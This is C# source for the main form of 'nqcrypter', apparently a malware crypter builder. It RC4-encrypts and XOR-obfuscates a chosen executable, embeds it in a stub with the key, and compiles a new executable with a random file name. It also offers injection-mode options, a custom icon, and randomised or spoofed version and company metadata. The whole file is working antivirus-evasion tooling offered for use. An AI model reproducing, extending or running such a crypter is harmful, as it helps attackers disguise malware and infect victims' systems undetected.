using Microsoft.VisualBasic;
using System;
using System.IO;
using System.Text.RegularExpressions;
using System.ComponentModel;
using System.Collections.Generic;
using System.Data;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Reflection;

namespace nqcrypter
{
    public partial class Form1 : Form
    {

        public string inj;
        public string key;
        string icoyol="";
        public Random rand = new Random();
        public Form1()
        {
            InitializeComponent();
            title.Enabled = false;
            description.Enabled = false;
            company.Enabled = false;
            trademark.Enabled = false;
            copyright.Enabled = false;
            product.Enabled = false;
            file_version.Enabled = false;
            description.Enabled = false;
            version.Enabled = false;
        }
        static string ByteArrayToString(byte[] ba)
        {
            return BitConverter.ToString(ba).Replace("-", "");
        }
        private string RandomString(int length)
        {
            string pool = "abcdefghijklmnopqrstuvwxyz0123456789";
            pool += pool.ToUpper();
            string tmp = "";
            Random R = new Random();
            for (int x = 0; x < length; x++)
            {
                tmp += pool[R.Next(0, pool.Length)].ToString();
            }
            return tmp;
        }


        private void button3_Click(object sender, EventArgs e)
            
        {
            if (radioButton1.Checked) { inj = "1"; }
            if (radioButton2.Checked) { inj = "2"; }
            if (radioButton3.Checked) { inj = "3"; }
            string x = RandomString(rand.Next(20, 50));
            string bytesString = ByteArrayToString(RC4(Encoding.Default.GetBytes(x), File.ReadAllBytes(textBox1.Text)));


            CompilerParameters Params = new CompilerParameters();
            Params.GenerateExecutable = true;

            Params.ReferencedAssemblies.Add("System.dll");
            Params.ReferencedAssemblies.Add("System.Management.dll");
            Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            if (icoyol == "")
                Params.CompilerOptions = "/t:winexe /unsafe /platform:x86 /debug-";
            else
                Params.CompilerOptions = "/t:winexe /unsafe /platform:x86 /debug- /win32icon:\"" + icoyol + "\"";
            string filename = RandomString(rand.Next(7, 10)) + ".exe";
            Params.OutputAssembly = filename;

            string Source = Properties.Resources.stub;
            if(checkBox2.Checked)
            {
                Source = Source.Replace("[title-replace]", title.Text);
                Source = Source.Replace("[company-replace]", company.Text);
                Source = Source.Replace("[product-replace]", product.Text);
                Source = Source.Replace("[copyright-replace]",copyright.Text);
                Source = Source.Replace("[trademark-replace]", trademark.Text);
                Source = Source.Replace("[desc-replace]", description.Text);
                Source = Source.Replace("[fversion-replace]", file_version.Text);
            }
            else
            {
                Source = Source.Replace("[title-replace]","Build");
                Source = Source.Replace("[company-replace]", "Build");
                Source = Source.Replace("[product-replace]", "Build");
                Source = Source.Replace("[copyright-replace]", "Build");
                Source = Source.Replace("[trademark-replace]", "Build");
                Source = Source.Replace("[desc-replace]","Build");
                Source = Source.Replace("[fversion-replace]", "1.0.0.0");
            }
            Source = Source.Replace("[BYTES]", XOR(bytesString));
            Source = Source.Replace("[PASSWORD]", x);
            Source = Source.Replace("[FILENAME]", filename);

            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0");

            CompilerResults Result = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source);

            if (Result.Errors.Count > 0)
            {
                foreach (CompilerError err in Result.Errors)
                    MessageBox.Show(err.ToString());
            }
            else
            {
                MessageBox.Show("cryted");
            }
        }
        static byte[] RC4(byte[] pwd, byte[] data)
        {
            int a, i, j, k, tmp;
            int[] key, box;
            byte[] cipher;

            key = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];

            for (i = 0; i < 256; i++)
            {
                key[i] = pwd[i % pwd.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++)
            {
                j = (j + box[i] + key[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++)
            {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }
        static string XOR(string target)
        {
            string result = "";

            for (int i = 0; i < target.Length; i++)
            {
                char ch = (char)(target[i] ^ 123);
                result += ch;
            }

            return result;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Application.ExitThread();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            radioButton1.Select();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog server = new OpenFileDialog();
            server.Filter = "ICO | *.ico";
            if (server.ShowDialog() == DialogResult.OK)
                icoyol = server.FileName;
            else
                MessageBox.Show("no choose.");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog server = new OpenFileDialog();
            server.Filter = "Exe | *.exe";
            if (server.ShowDialog() == DialogResult.OK)
                textBox1.Text = server.FileName;
            else
                MessageBox.Show("no choose.");
        }

        private void groupBox4_Enter(object sender, EventArgs e)
        {

        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }
        private string RandomNumber(int _length)
        {
            //Making a random number for the random assemblys version
            string pool = "0123456789";
            pool += pool.ToUpper();
            string tmp = "";
            Random R = new Random();
            for (int x = 0; x < _length; x++)
            {
                tmp += pool[R.Next(0, pool.Length)].ToString();
            }
            return tmp;
        }
        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {
            if (checkBox1.Checked) {
            title.Text = RandomString(9);
            description.Text = RandomString(16);
            company.Text = RandomString(19);
            trademark.Text = RandomString(21);
            copyright.Text = RandomString(18);
            product.Text = (RandomNumber(1) + "." + RandomNumber(2) + "." + RandomNumber(1) + "." + RandomNumber(1));
            file_version.Text = (RandomNumber(1) + "." + RandomNumber(1) + "." + RandomNumber(2) + "." + RandomNumber(2));
            description.Text = RandomString(17);
            version.Text = RandomString(15);

            title.Enabled = false;
            description.Enabled = false;
            company.Enabled = false;
            trademark.Enabled = false;
            copyright.Enabled = false;
            product.Enabled = false;
            file_version.Enabled = false;
            description.Enabled = false;
            version.Enabled = false;
            }
            else
            {
                title.Text = "";
                description.Text = "";
                company.Text = "";
                trademark.Text = "";
                copyright.Text = "";
                product.Text = "";
                file_version.Text = "";
                description.Text = "";
                version.Text = "";

                title.Enabled = true;
                description.Enabled = true;
                company.Enabled = true;
                trademark.Enabled = true;
                copyright.Enabled = true;
                product.Enabled = true;
                file_version.Enabled = true;
                description.Enabled = true;
                version.Enabled = true;
            }

        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {

                title.Enabled = true;
                description.Enabled = true;
                company.Enabled = true;
                trademark.Enabled = true;
                copyright.Enabled = true;
                product.Enabled = true;
                file_version.Enabled = true;
                description.Enabled = true;
                version.Enabled = true;


            }
            else
            {

                title.Enabled = false;
                description.Enabled = false;
                company.Enabled = false;
                trademark.Enabled = false;
                copyright.Enabled = false;
                product.Enabled = false;
                file_version.Enabled = false;
                description.Enabled = false;
                version.Enabled = false;

            }
        }
    }
}
